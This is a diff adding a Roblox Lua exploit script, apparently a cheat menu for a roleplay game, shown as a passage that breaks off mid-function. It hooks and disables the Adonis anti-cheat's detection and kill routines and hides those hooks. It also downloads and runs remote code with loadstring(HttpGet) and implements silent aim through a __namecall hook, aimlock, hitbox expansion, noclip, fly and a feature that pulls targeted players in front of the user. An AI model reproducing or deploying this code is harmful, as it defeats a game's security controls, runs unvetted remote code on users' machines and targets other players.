@@ -1,0 +1,2819 @@
+local getinfo = getinfo or debug.getinfo
+local DEBUG = false
+local Hooked = {}
+
+setthreadidentity(2)
+
+for i, v in getgc(true) do
+    if typeof(v) == "table" then
+        local DetectFunc = rawget(v, "Detected")
+        local KillFunc = rawget(v, "Kill")
+
+        if typeof(DetectFunc) == "function" and not Detected then
+            Detected = DetectFunc
+
+            local Old
+            Old = hookfunction(Detected, function(Action, Info, NoCrash)
+                if Action ~= "_" then
+                    if DEBUG then
+                        warn(`Adonis AntiCheat flagged\nMethod: {Action}\nInfo: {Info}`)
+                    end
+                end
+                return true
+            end)
+
+            table.insert(Hooked, Detected)
+        end
+
+        if rawget(v, "Variables") and rawget(v, "Process") and typeof(KillFunc) == "function" and not Kill then
+            Kill = KillFunc
+
+            local Old
+            Old = hookfunction(Kill, function(Info)
+                if DEBUG then
+                    warn(`Adonis AntiCheat tried to kill (fallback): {Info}`)
+                end
+            end)
+
+            table.insert(Hooked, Kill)
+        end
+    end
+end
+
+local Old
+Old = hookfunction(getrenv().debug.info, newcclosure(function(...)
+    local LevelOrFunc, Info = ...
+
+    if Detected and LevelOrFunc == Detected then
+        if DEBUG then
+            warn(`zins | adonis bypassed`)
+        end
+        return coroutine.yield(coroutine.running())
+    end
+
+    return Old(...)
+end))
+
+setthreadidentity(7)
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local ProximityPromptService = game:GetService("ProximityPromptService")
+local HttpService = game:GetService("HttpService")
+
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+local mouse = LocalPlayer:GetMouse()
+
+local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/HoodGames/Script/refs/heads/main/PRPSLOADERehu"))()
+Rayfield:LoadConfiguration()
+
+local Window = Rayfield:CreateWindow({
+    Name = "Pinoy RP Selda By NLT",
+    LoadingTitle = "Pinoy RP Selda",
+    LoadingSubtitle = "By NLT",
+    ToggleUIKeybind = "P",
+
+    ConfigurationSaving = { Enabled = true, FileName = "Big Hub" },
+    Discord = { Enabled = false, Invite = "https://discord.com/invite/vzcAqAgpgQ" },
+    KeySystem = false,
+    KeySettings = { Title = "Join /nlt (discord.gg/nlt)", Note = "Ping @hidinginthedarkestplace in wrld", Key = {"ehuontop", "EHUONTOP", "zeicute", "ZEICUTE"} }
+})
+
+local MainTab = Window:CreateTab("Main", 4483362458)
+local MainSection = MainTab:CreateSection("Main Scripts")
+MainSection:Set("Main Scripts")
+MainTab:CreateDivider()
+
+local CFloop = nil
+local CFspeed = 150
+local originalCFrame = nil
+
+local function enableCFly()
+    local character = LocalPlayer.Character
+    if not character then return end
+    local humanoid = character:FindFirstChildOfClass('Humanoid')
+    local Head = character:FindFirstChild("Head")
+    local hrp = character:FindFirstChild("HumanoidRootPart")
+     
+    if not humanoid or not Head or not hrp then return end
+
+    originalCFrame = hrp.CFrame
+    humanoid.PlatformStand = true
+    Head.Anchored = true
+
+    if CFloop then CFloop:Disconnect() end
+    CFloop = RunService.Heartbeat:Connect(function(deltaTime)
+        local moveDirection = humanoid.MoveDirection * (CFspeed * deltaTime)
+        local headCFrame = Head.CFrame
+        local cameraCFrame = Camera.CFrame
+        local cameraOffset = headCFrame:ToObjectSpace(cameraCFrame).Position
+        cameraCFrame = cameraCFrame * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
+        local cameraPosition = cameraCFrame.Position
+        local headPosition = headCFrame.Position
+
+        local objectSpaceVelocity = CFrame.new(cameraPosition, Vector3.new(headPosition.X, cameraPosition.Y, headPosition.Z)):VectorToObjectSpace(moveDirection)
+        Head.CFrame = CFrame.new(headPosition) * (cameraCFrame - cameraPosition) * CFrame.new(objectSpaceVelocity)
+    end)
+end
+
+local function disableCFly()
+    if CFloop then
+        CFloop:Disconnect()
+        CFloop = nil
+    end
+
+    local character = LocalPlayer.Character
+    if character then
+        local humanoid = character:FindFirstChildOfClass('Humanoid')
+        local Head = character:FindFirstChild("Head")
+        local hrp = character:FindFirstChild("HumanoidRootPart")
+
+        if Head then Head.Anchored = false end
+        if humanoid then humanoid.PlatformStand = false end
+        if hrp and originalCFrame then hrp.CFrame = originalCFrame end
+    end
+end
+
+local cflyActive = false
+local cflyToggleObj
+
+cflyToggleObj = MainTab:CreateToggle({
+    Name = "CFrame Fly Return",
+    CurrentValue = false,
+    Flag = "CFlyReturnToggle",
+    Callback = function(Value)
+        cflyActive = Value
+        if Value then enableCFly() else disableCFly() end
+    end,
+})
+
+UIS.InputBegan:Connect(function(input, gameProcessed)
+    if input.UserInputType == Enum.UserInputType.MouseButton3 then
+        cflyActive = not cflyActive
+        if cflyToggleObj and cflyToggleObj.Set then
+            cflyToggleObj:Set(cflyActive)
+        else
+            if cflyActive then enableCFly() else disableCFly() end
+        end
+    end
+end)
+
+MainTab:CreateDivider()
+
+local NoclipConnection = nil
+local ClipEnabled = false
+
+local function noclipLoop()
+    if not ClipEnabled then return end
+    local character = LocalPlayer.Character
+    if character then
+        for _, v in pairs(character:GetDescendants()) do
+            if v:IsA("BasePart") then
+                v.CanCollide = false
+            end
+        end
+    end
+end
+
+local function noclip()
+    ClipEnabled = true
+    if NoclipConnection then NoclipConnection:Disconnect() end
+    NoclipConnection = RunService.Stepped:Connect(noclipLoop)
+end
+
+local function clip()
+    ClipEnabled = false
+    if NoclipConnection then
+        NoclipConnection:Disconnect()
+        NoclipConnection = nil
+    end
+    local character = LocalPlayer.Character
+    if character then
+        for _, v in pairs(character:GetDescendants()) do
+            if v:IsA("BasePart") then
+                if v.Name == "HumanoidRootPart" then
+                    v.CanCollide = false
+                else
+                    v.CanCollide = true
+                end
+            end
+        end
+    end
+end
+
+MainTab:CreateToggle({
+    Name = "Noclip",
+    CurrentValue = false,
+    Flag = "NoclipToggle",
+    Callback = function(Value)
+        if Value then noclip() else clip() end
+    end,
+})
+
+LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(1)
+    if ClipEnabled then 
+        noclip() 
+    else 
+        clip()
+    end
+end)
+
+MainTab:CreateDivider()
+
+local CycleSpamActive = false
+
+local function click()
+    local mouseLocation = UIS:GetMouseLocation()
+    VirtualInputManager:SendMouseButtonEvent(mouseLocation.X, mouseLocation.Y, 0, true, game, 1)
+    task.wait(0.01)
+    VirtualInputManager:SendMouseButtonEvent(mouseLocation.X, mouseLocation.Y, 0, false, game, 1)
+end
+
+local function getAllMatchingTools(toolNames)
+    local char = LocalPlayer.Character
+    local backpack = LocalPlayer:FindFirstChild("Backpack")
+    local foundTools = {}
+
+    local function checkContainer(container)
+        if not container then return end
+        for _, child in ipairs(container:GetChildren()) do
+            if child:IsA("Tool") then
+                for _, name in ipairs(toolNames) do
+                    if child.Name == name then
+                        table.insert(foundTools, child)
+                        break
+                    end
+                end
+            end
+        end
+    end
+
+    checkContainer(char)
+    checkContainer(backpack)
+
+    return foundTools
+end
+
+MainTab:CreateToggle({
+    Name = "Cycle Items Spam",
+    CurrentValue = false,
+    Flag = "ToggleCycleItemsSpamActive",
+    Callback = function(Value)
+        CycleSpamActive = Value
+
+        if CycleSpamActive then
+            task.spawn(function()
+                local toolNames = {"Pipe", "Rake", "Sledgehammer", "Butcher Knife", "Wrench", "Frying Pan"}
+
+                while CycleSpamActive do
+                    local char = LocalPlayer.Character
+                    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
+
+                    if humanoid then
+                        local tools = getAllMatchingTools(toolNames)
+
+                        for _, tool in ipairs(tools) do
+                            if not CycleSpamActive then break end
+
+                            if tool and tool.Parent then
+                                humanoid:EquipTool(tool)
+                                task.wait(0.02)
+                                click()
+                            end
+
+                            task.wait(0.04)
+                        end
+                    else
+                        task.wait(0.1)
+                    end
+                    
+                    task.wait(0.05)
+                end
+                CycleSpamActive = false
+            end)
+        end
+    end,
+})
+
+MainTab:CreateDivider()
+
+local HITBOX_ENABLED = false
+local HITBOX_PART = "Head"
+local HITBOX_SIZE = 10
+local ORIGINAL_HITBOX = {}
+local HbConnections = {}
+
+local RESTRICTED_WEAPONS = {
+    ["M4A1"] = true,
+    ["Glock17"] = true,
+    ["Magnum"] = true,
+    ["Deagle"] = true,
+    ["FNP-45"] = true,
+    ["AKS-74U"] = true,
+}
+
+local function isHoldingRestrictedWeapon()
+    local char = LocalPlayer.Character
+    if not char then return false end
+
+    for _, item in ipairs(char:GetChildren()) do
+        if item:IsA("Tool") and RESTRICTED_WEAPONS[item.Name] then
+            return true
+        end
+    end
+    return false
+end
+
+local function getTargetPart(char)
+    if HITBOX_PART == "Head" then
+        return char:FindFirstChild("Head")
+    else
+        return char:FindFirstChild("UpperTorso")
+            or char:FindFirstChild("Torso")
+            or char:FindFirstChild("LowerTorso")
+    end
+end
+
+local function restoreHitbox(player, char)
+    if player == LocalPlayer then return end
+    if not char then return end
+    if not ORIGINAL_HITBOX[player] then return end
+
+    for part, data in pairs(ORIGINAL_HITBOX[player]) do
+        if part and part.Parent then
+            pcall(function()
+                part.Size = data.Size
+                part.Transparency = data.Transparency
+                part.Material = data.Material
+                part.Color = data.Color
+                part.CanCollide = true
+                part.Massless = false
+            end)
+        end
+    end
+
+    ORIGINAL_HITBOX[player] = nil
+end
+
+local function applyHitbox(player, char)
+    if player == LocalPlayer then return end
+    if not char then return end
+
+    local part = getTargetPart(char)
+    if not part then return end
+
+    ORIGINAL_HITBOX[player] = ORIGINAL_HITBOX[player] or {}
+
+    if not ORIGINAL_HITBOX[player][part] then
+        ORIGINAL_HITBOX[player][part] = {
+            Size = part.Size,
+            Transparency = part.Transparency,
+            Material = part.Material,
+            Color = part.Color
+        }
+    end
+
+    local originalSize = ORIGINAL_HITBOX[player][part].Size
+    part.Size = originalSize * HITBOX_SIZE
+    part.Transparency = 0.7
+    part.Material = ORIGINAL_HITBOX[player][part].Material
+    part.Color = ORIGINAL_HITBOX[player][part].Color
+    part.CanCollide = false
+    part.Massless = true
+end
+
+local function disableHitbox()
+    HITBOX_ENABLED = false
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character then
+            restoreHitbox(p, p.Character)
+        end
+    end
+end
+
+local function enableHitbox()
+    if isHoldingRestrictedWeapon() then return end
+
+    HITBOX_ENABLED = true
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character then
+            applyHitbox(p, p.Character)
+        end
+    end
+end
+
+local function setupHbPlayer(player)
+    if player == LocalPlayer then return end
+
+    local charConn = player.CharacterAdded:Connect(function(char)
+        if HITBOX_ENABLED and not isHoldingRestrictedWeapon() then
+            char:WaitForChild("HumanoidRootPart", 5)
+            applyHitbox(player, char)
+        end
+    end)
+
+    HbConnections[player] = HbConnections[player] or {}
+    table.insert(HbConnections[player], charConn)
+
+    if player.Character and HITBOX_ENABLED and not isHoldingRestrictedWeapon() then
+        applyHitbox(player, player.Character)
+    end
+end
+
+Players.PlayerAdded:Connect(setupHbPlayer)
+Players.PlayerRemoving:Connect(function(player)
+    restoreHitbox(player, player.Character)
+    if HbConnections[player] then
+        for _, conn in ipairs(HbConnections[player]) do
+            conn:Disconnect()
+        end
+        HbConnections[player] = nil
+    end
+end)
+
+for _, p in ipairs(Players:GetPlayers()) do
+    setupHbPlayer(p)
+end
+
+MainTab:CreateToggle({
+    Name = "Hitbox Expander",
+    CurrentValue = false,
+    Flag = "ToggleHitboxExpanderActive",
+    Callback = function(Value)
+        if isHoldingRestrictedWeapon() then return end
+
+        if Value then
+            enableHitbox()
+        else
+            disableHitbox()
+        end
+    end,
+})
+
+MainTab:CreateDropdown({
+    Name = "Hitbox Type",
+    Options = {"Head", "Torso"},
+    CurrentOption = {"Head"},
+    MultipleOptions = false,
+    Callback = function(opt)
+        HITBOX_PART = opt[1]
+        if HITBOX_ENABLED and not isHoldingRestrictedWeapon() then
+            disableHitbox()
+            task.wait()
+            enableHitbox()
+        end
+    end,
+})
+
+MainTab:CreateSlider({
+    Name = "Hitbox Size",
+    Range = {1, 25},
+    Increment = 1,
+    CurrentValue = 10,
+    Callback = function(val)
+        HITBOX_SIZE = val
+        if HITBOX_ENABLED and not isHoldingRestrictedWeapon() then
+            disableHitbox()
+            task.wait()
+            enableHitbox()
+        end
+    end,
+})
+
+RunService.RenderStepped:Connect(function()
+    if HITBOX_ENABLED and isHoldingRestrictedWeapon() then
+        disableHitbox()
+        return
+    end
+
+    if HITBOX_ENABLED then
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LocalPlayer and p.Character then
+                applyHitbox(p, p.Character)
+            end
+        end
+    end
+end)
+
+MainTab:CreateDivider()
+
+   local targetLock = false
+    local lockedPlayer = nil
+    local toggleEnabled = false
+    local currentKeybind = Enum.KeyCode.T
+    local aimlockMode = "Head"
+
+    local function getClosestPlayer()
+        local closestPlayer = nil
+        local shortestDistance = math.huge
+
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                local character = player.Character
+                local targetPart = character and (aimlockMode == "Head" and character:FindFirstChild("Head") or (character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")))
+                local humanoid = character and character:FindFirstChild("Humanoid")
+
+                if targetPart and humanoid and humanoid.Health > 0 then
+                    local screenPos, onScreen = Camera:WorldToViewportPoint(targetPart.Position)
+
+                    if onScreen then
+                        local mousePos = Vector2.new(mouse.X, mouse.Y)
+                        local distance = (mousePos - Vector2.new(screenPos.X, screenPos.Y)).Magnitude
+
+                        if distance < shortestDistance then
+                            shortestDistance = distance
+                            closestPlayer = player
+                        end
+                    end
+                end
+            end
+        end
+
+        return closestPlayer
+    end
+
+    local function lockOntoPlayer()
+        local closestPlayer = getClosestPlayer()
+        if closestPlayer then
+            lockedPlayer = closestPlayer
+            targetLock = true
+        end
+    end
+
+    local function updateLock()
+        if not lockedPlayer or not lockedPlayer.Character then return end
+
+        local character = lockedPlayer.Character
+        local targetPart = aimlockMode == "Head" and character:FindFirstChild("Head") or (character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso"))
+        local root = character:FindFirstChild("HumanoidRootPart")
+
+        if targetPart and root then
+            local targetPos = targetPart.Position
+            local myCharacter = LocalPlayer.Character
+            local myRoot = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart")
+        
+            if myRoot then
+                local distance = (myRoot.Position - root.Position).Magnitude
+                local verticalOffset = aimlockMode == "Head" and (0.2 + (distance * 0.03)) or (0.5 + math.clamp(distance * 0.015, 0.1, 1.2))
+                targetPos = targetPos + Vector3.new(0, verticalOffset, 0)
+            end
+
+            Camera.CFrame = CFrame.new(Camera.CFrame.Position, targetPos)
+        else
+            lockedPlayer = nil
+            targetLock = false
+        end
+    end
+
+    UIS.InputBegan:Connect(function(input, gameProcessed)
+        if gameProcessed then return end
+        if input.KeyCode == currentKeybind then
+            if not toggleEnabled then return end
+
+            if targetLock then
+                targetLock = false
+                lockedPlayer = nil
+            else
+                lockOntoPlayer()
+            end
+        end
+    end)
+
+    RunService.RenderStepped:Connect(function()
+        if toggleEnabled and targetLock then
+            updateLock()
+        end
+    end)
+
+local targetEntities = { "Player" }
+local targetPart = "Head"
+local v1 = {}
+local v2 = {}
+local ignoreFriends = false
+local currentValue = false
+local v3 = false
+local currentValue2 = false
+local hitChance = 100
+local currentValue3 = false
+local fovRadius = 100
+local currentValue4 = false
+local wallCheck = false
+local v4 = false
+local currentValue5 = false
+local smoothnessSlider = 1
+local rightMouseDown = false
+local circle
+
+pcall(function()
+  if Drawing then
+    circle = Drawing.new("Circle")
+    circle.Thickness = 1
+    circle.Color = Color3.fromRGB(255, 255, 255)
+    circle.Filled = false
+    circle.Radius = fovRadius
+    circle.Visible = false
+  end
+end)
+
+UIS.InputBegan:Connect(function(input)
+  if input.UserInputType == Enum.UserInputType.MouseButton2 then
+    rightMouseDown = true
+  end
+end)
+
+UIS.InputEnded:Connect(function(input)
+  if input.UserInputType == Enum.UserInputType.MouseButton2 then
+    rightMouseDown = false
+  end
+end)
+
+local v5 = {}
+
+for _, value in pairs(Players:GetPlayers()) do
+  if value ~= LocalPlayer then
+    task.spawn(function()
+      pcall(function() v5[value.UserId] = LocalPlayer:IsFriendsWith(value.UserId) end)
+    end)
+  end
+end
+
+Players.PlayerAdded:Connect(function(player3)
+  if player3 ~= LocalPlayer then
+    task.spawn(function()
+      pcall(function() v5[player3.UserId] = LocalPlayer:IsFriendsWith(player3.UserId) end)
+    end)
+  end
+end)
+
+Players.PlayerRemoving:Connect(function(player4)
+  v5[player4.UserId] = nil
+end)
+
+local instance
+
+RunService.RenderStepped:Connect(function()
+  if circle then
+    local viewportSize = Camera.ViewportSize
+    circle.Position = Vector2.new(viewportSize.X / 2, viewportSize.Y / 2)
+    circle.Radius = fovRadius
+    circle.Visible = currentValue3 and (v3 or v4)
+  end
+
+  if v4 and rightMouseDown and instance and instance.Parent then
+    local humanoid = instance.Parent:FindFirstChild("Humanoid")
+    if humanoid and humanoid.Health > 0 and humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
+      local cframe = CFrame.new(Camera.CFrame.Position, instance.Position)
+      if smoothnessSlider >= 1 then
+        Camera.CFrame = cframe
+      else
+        Camera.CFrame = Camera.CFrame:Lerp(cframe, smoothnessSlider)
+      end
+    else
+      instance = nil
+    end
+  elseif v4 and not rightMouseDown then
+    instance = nil
+  end
+end)
+
+local map = {}
+
+task.spawn(function()
+  while task.wait(3) do
+    if table.find(targetEntities, "Npc") then
+      local list = {}
+      for _, value3 in pairs(workspace:GetDescendants()) do
+        if value3:IsA("Humanoid") and value3.Health > 0
+          and value3:GetState() ~= Enum.HumanoidStateType.Dead and value3.Parent
+          and value3.Parent:IsA("Model") then
+          local parent = value3.Parent
+          if parent ~= LocalPlayer.Character and not Players:GetPlayerFromCharacter(parent) then
+            table.insert(list, parent)
+          end
+        end
+      end
+      map = list
+    end
+  end
+end)
+
+local function f3(p1)
+  local viewportSize2 = Camera.ViewportSize
+  local vector = Vector2.new(viewportSize2.X / 2, viewportSize2.Y / 2)
+  local list2 = {}
+
+  if table.find(targetEntities, "Player") then
+    for _, value4 in pairs(Players:GetPlayers()) do
+      if value4 ~= LocalPlayer then
+        if not (currentValue4 and LocalPlayer.Team ~= nil and value4.Team == LocalPlayer.Team) then
+          if not (ignoreFriends and v5[value4.UserId]) then
+            if not (#v2 > 0 and table.find(v2, value4.Name)) then
+              if not (#v1 > 0 and (value4.Team == nil or not table.find(v1, value4.Team.Name))) then
+                local character2 = value4.Character
+                if character2 then table.insert(list2, character2) end
+              end
+            end
+          end
+        end
+      end
+    end
+  end
+
+  if table.find(targetEntities, "Npc") then
+    for _, value5 in pairs(map) do
+      if value5 and value5.Parent then table.insert(list2, value5) end
+    end
+  end
+
+  local v11, v12
+
+  for _, value6 in pairs(list2) do
+    if not (currentValue and value6:FindFirstChildOfClass("ForceField")) then
+      local humanoid3 = value6:FindFirstChild("Humanoid")
+      if humanoid3 and humanoid3.Health > 0 and humanoid3:GetState() ~= Enum.HumanoidStateType.Dead then
+        local head2
+
+        if p1 or targetPart == "Random" then
+          local list3 = {}
+          for _, value7 in ipairs({
+            "Head", "HumanoidRootPart", "UpperTorso", "LowerTorso", "Torso", "RightArm",
+            "LeftArm", "RightLeg", "LeftLeg",
+          }) do
+            local findFirstChild = value6:FindFirstChild(value7)
+            if findFirstChild then table.insert(list3, findFirstChild) end
+          end
+          if #list3 > 0 then
+            if p1 then
+              local huge = math.huge
+              for _, value8 in ipairs(list3) do
+                local screenPoint2, onScreen2 = Camera:WorldToScreenPoint(value8.Position)
+                if onScreen2 then
+                  local magnitude = (vector - Vector2.new(screenPoint2.X, screenPoint2.Y)).Magnitude
+                  if magnitude < huge then head2 = value8; huge = magnitude end
+                end
+              end
+            else
+              head2 = list3[math.random(1, #list3)]
+            end
+          end
+        elseif targetPart == "Head" then
+          head2 = value6:FindFirstChild("Head")
+        elseif targetPart == "Torso" then
+          head2 = value6:FindFirstChild("Torso") or value6:FindFirstChild("UpperTorso")
+            or value6:FindFirstChild("HumanoidRootPart")
+        elseif targetPart == "HumanoidRootPart" then
+          head2 = value6:FindFirstChild("HumanoidRootPart")
+        end
+
+        if head2 then
+          local flag = true
+          if wallCheck then
+            local character3 = LocalPlayer.Character
+            if character3 then
+              local raycastParams = RaycastParams.new()
+              raycastParams.FilterDescendantsInstances = { character3, value6 }
+              raycastParams.FilterType = Enum.RaycastFilterType.Exclude
+              local raycast = workspace:Raycast(
+                Camera.CFrame.Position,
+                head2.Position - Camera.CFrame.Position,
+                raycastParams
+              )
+              if raycast and not raycast.Instance:IsDescendantOf(value6) then flag = false end
+            end
+          end
+
+          if flag then
+            local screenPoint3, onScreen3 = Camera:WorldToScreenPoint(head2.Position)
+            if onScreen3 then
+              local magnitude2 = (vector - Vector2.new(screenPoint3.X, screenPoint3.Y)).Magnitude
+              if magnitude2 <= fovRadius and magnitude2 <= (v12 or fovRadius) then
+                v11 = head2
+                v12 = magnitude2
+              end
+            end
+          end
+        end
+      end
+    end
+  end
+
+  return v11
+end
+
+local instance2
+
+RunService.Heartbeat:Connect(function()
+  if v3 then
+    local ok, result = pcall(f3, currentValue2)
+    if ok then instance2 = result end
+  else
+    instance2 = nil
+  end
+
+  if v4 and rightMouseDown then
+    local ok2, result2 = pcall(f3, currentValue5)
+    if ok2 then instance = result2 end
+  else
+    instance = nil
+  end
+end)
+
+local v13
+pcall(function()
+  if not hookmetamethod or not newcclosure or not getnamecallmethod then return end
+  v13 = hookmetamethod(game, "__namecall", newcclosure(function(...)
+    local namecallmethod = getnamecallmethod()
+    local args = { ... }
+
+    if v3 and args[1] == workspace and not checkcaller() and namecallmethod == "Raycast" then
+      local target = instance2
+      if target and target.Parent and math.random(1, 100) <= hitChance then
+        local ok, result = pcall(function()
+          local origin = args[2]
+          if typeof(origin) ~= "Vector3" then return nil end
+          args[3] = (target.Position - origin).Unit * 1000
+          return v13(unpack(args))
+        end)
+        if ok and result ~= nil then return result end
+      end
+    end
+
+    return v13(...)
+  end))
+end)
+
+-- ===== YOUR TAB (already in your script — kept here for placement clarity) =====
+local CombatTab = Window:CreateTab("Combat", 4483362458)
+local CombatSection = CombatTab:CreateSection("Combat Scripts")
+CombatSection:Set("Combat Scripts")
+CombatTab:CreateDivider()
+
+    CombatTab:CreateToggle({
+        Name = "Toggle Aimlock (T)",
+        CurrentValue = false,
+        Flag = "TargetLockToggleT",
+        Callback = function(Value)
+            toggleEnabled = Value
+            if not Value then
+                targetLock = false
+                lockedPlayer = nil
+            end
+        end,
+    })
+
+    CombatTab:CreateDivider()
+
+    CombatTab:CreateToggle({
+  Name = "Aim Lock (Hold RMB)",
+  CurrentValue = v4,
+  Flag = "AimLockToggle",
+  Callback = function(v) v4 = v end,
+})
+
+CombatTab:CreateToggle({
+  Name = "Aim Lock Nearest (Part)",
+  CurrentValue = currentValue5,
+  Flag = "AimLockNearest",
+  Callback = function(v) currentValue5 = v end,
+})
+
+CombatTab:CreateSlider({
+  Name = "Aim Lock Smoothness",
+  Range = { 0.1, 1 },
+  Increment = 0.1,
+  Suffix = "Lerp",
+  CurrentValue = smoothnessSlider,
+  Flag = "SmoothnessSlider",
+  Callback = function(v) smoothnessSlider = v end,
+})
+
+    CombatTab:CreateDivider()
+
+-- ===== CONTROLS =====
+local options = {}
+pcall(function()
+  if teams then
+    for _, value9 in pairs(teams:GetTeams()) do
+      table.insert(options, value9.Name)
+    end
+  end
+end)
+if #options == 0 then table.insert(options, "None") end
+
+CombatTab:CreateToggle({
+  Name = "Silent Aim",
+  CurrentValue = v3,
+  Flag = "SilentAimToggle",
+  Callback = function(v) v3 = v end,
+})
+
+CombatTab:CreateToggle({
+  Name = "Silent Aim Nearest (Part)",
+  CurrentValue = currentValue2,
+  Flag = "SilentAimNearest",
+  Callback = function(v) currentValue2 = v end,
+})
+
+CombatTab:CreateSlider({
+  Name = "Hit Chance",
+  Range = { 0, 100 },
+  Increment = 1,
+  Suffix = "%",
+  CurrentValue = hitChance,
+  Flag = "HitChanceSlider",
+  Callback = function(v) hitChance = v end,
+})
+
+CombatTab:CreateToggle({
+  Name = "Show FOV Circle",
+  CurrentValue = currentValue3,
+  Flag = "FOVVisibleToggle",
+  Callback = function(v) currentValue3 = v end,
+})
+
+CombatTab:CreateSlider({
+  Name = "FOV Radius",
+  Range = { 10, 500 },
+  Increment = 5,
+  Suffix = "Radius",
+  CurrentValue = fovRadius,
+  Flag = "FOVSlider",
+  Callback = function(v) fovRadius = v end,
+})
+
+CombatTab:CreateDivider()
+
+CombatTab:CreateDropdown({
+  Name = "Target Entities",
+  Options = { "Player", "Npc" },
+  CurrentOption = { "Player" },
+  MultipleOptions = true,
+  Flag = "TargetEntityDropdown",
+  Callback = function(v) targetEntities = v end,
+})
+
+CombatTab:CreateDropdown({
+  Name = "Target Part",
+  Options = { "Head", "Torso", "Random" },
+  CurrentOption = { "Head" },
+  MultipleOptions = false,
+  Flag = "TargetPartDropdown",
+  Callback = function(v) targetPart = v[1] end,
+})
+
+CombatTab:CreateDropdown({
+  Name = "Target Specific Teams",
+  Options = options,
+  CurrentOption = {},
+  MultipleOptions = true,
+  Flag = "TargetTeamsDropdown",
+  Callback = function(v) v1 = v end,
+})
+
+CombatTab:CreateToggle({
+  Name = "Team Check (Ignore Allies)",
+  CurrentValue = currentValue4,
+  Flag = "TeamCheckToggle",
+  Callback = function(v) currentValue4 = v end,
+})
+
+CombatTab:CreateToggle({
+  Name = "Ignore Friends",
+  CurrentValue = ignoreFriends,
+  Flag = "IgnoreFriendsToggle",
+  Callback = function(v) ignoreFriends = v end,
+})
+
+local options2 = {}
+for _, value21 in ipairs(Players:GetPlayers()) do
+  if value21 ~= LocalPlayer then table.insert(options2, value21.Name) end
+end
+
+local dropdown = CombatTab:CreateDropdown({
+  Name = "Ignore Players (Selector)",
+  Options = options2,
+  CurrentOption = {},
+  MultipleOptions = true,
+  Flag = "IgnorePlayersDropdown",
+  Callback = function(v) v2 = v end,
+})
+
+Players.PlayerAdded:Connect(function(p)
+  if p ~= LocalPlayer then
+    table.insert(options2, p.Name)
+    dropdown:Refresh(options2)
+  end
+end)
+
+Players.PlayerRemoving:Connect(function(p)
+  local pos = table.find(options2, p.Name)
+  if pos then
+    table.remove(options2, pos)
+    dropdown:Refresh(options2)
+  end
+end)
+
+CombatTab:CreateToggle({
+  Name = "ForceField Check",
+  CurrentValue = currentValue,
+  Flag = "ForceFieldCheckToggle",
+  Callback = function(v) currentValue = v end,
+})
+
+CombatTab:CreateToggle({
+  Name = "Wall Check",
+  CurrentValue = wallCheck,
+  Flag = "WallCheckToggle",
+  Callback = function(v) wallCheck = v end,
+})
+
+CombatTab:CreateDivider()
+
+local TargetTab = Window:CreateTab("Target", 4483362458)
+local TargetSection = TargetTab:CreateSection("Target Scripts")
+TargetSection:Set("Target Scripts")
+TargetTab:CreateDivider()
+
+local targetInputText = ""
+local viewEnabled = false
+local loopBringEnabled = false
+local bringT = {}
+
+local function getPlayersFromString(inputStr)
+    local matchedPlayers = {}
+    if not inputStr or inputStr == "" then return matchedPlayers end
+    
+    for query in string.gmatch(inputStr, "([^,]+)") do
+        query = query:match("^%s*(.-)%s*$")
+        query = string.lower(query)
+        
+        if query ~= "" then
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer then
+                    local nameLower = string.lower(player.Name)
+                    local displayNameLower = string.lower(player.DisplayName or "")
+                    
+                    if string.sub(nameLower, 1, #query) == query or string.sub(displayNameLower, 1, #query) == query or string.find(nameLower, query) or string.find(displayNameLower, query) then
+                        if not table.find(matchedPlayers, player) then
+                            table.insert(matchedPlayers, player)
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    return matchedPlayers
+end
+
+TargetTab:CreateInput({
+    Name = "Target Player(s)",
+    PlaceholderText = "e.g. zei, law or zeid, lawi",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(text)
+        targetInputText = text
+    end,
+})
+
+TargetTab:CreateToggle({
+    Name = "View",
+    CurrentValue = false,
+    Flag = "TargetViewToggle",
+    Callback = function(Value)
+        viewEnabled = Value
+        task.spawn(function()
+            while viewEnabled do
+                task.wait(0.1)
+                if viewEnabled then
+                    local targets = getPlayersFromString(targetInputText)
+                    if #targets > 0 and targets[1].Character then
+                        local humanoid = targets[1].Character:FindFirstChildOfClass("Humanoid")
+                        if humanoid then
+                            Camera.CameraSubject = humanoid
+                        end
+                    end
+                end
+            end
+            if LocalPlayer.Character then
+                local myHum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                if myHum then
+                    Camera.CameraSubject = myHum
+                end
+            end
+        end)
+    end,
+})
+
+TargetTab:CreateToggle({
+    Name = "LoopBring In Infront",
+    CurrentValue = false,
+    Flag = "LoopBringInFrontToggle",
+    Callback = function(Value)
+        loopBringEnabled = Value
+        
+        if loopBringEnabled then
+            task.spawn(function()
+                while loopBringEnabled do
+                    local targets = getPlayersFromString(targetInputText)
+                    local myChar = LocalPlayer.Character
+                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                    
+                    if myRoot and #targets > 0 then
+                        for _, plr in ipairs(targets) do
+                            if not loopBringEnabled then break end
+                            if plr and plr.Character then
+                                local pchar = plr.Character
+                                local pRoot = pchar:FindFirstChild("HumanoidRootPart")
+                                local pHum = pchar:FindFirstChildOfClass("Humanoid")
+                                
+                                if pRoot and pHum and pHum.Health > 0 then
+                                    local plrName = plr.Name
+                                    if not table.find(bringT, plrName) then
+                                        table.insert(bringT, plrName)
+                                    end
+                                    
